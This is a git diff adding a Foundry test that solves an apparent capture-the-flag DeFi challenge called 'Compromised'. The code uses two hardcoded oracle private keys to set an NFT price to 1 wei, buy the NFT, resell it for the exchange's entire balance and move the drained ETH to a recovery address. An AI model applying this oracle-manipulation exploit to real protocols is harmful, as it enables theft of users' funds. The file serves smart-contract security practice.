@@ -75,7 +75,52 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address source1 = vm.addr(pk1);
+        address source2 = vm.addr(pk2);
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 1 wei);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 1 wei);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        uint256 tokenid = exchange.buyOne{value:1 wei}();
+        vm.stopPrank();
+
+        uint256 totalAmountToDrain = address(exchange).balance;
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", totalAmountToDrain);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", totalAmountToDrain);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenid);
+        exchange.sellOne(tokenid);
+        vm.stopPrank();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        (bool success, ) = payable(recovery).call{value : EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "U came this far and failed bruh");
+        vm.stopPrank();
+
+        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
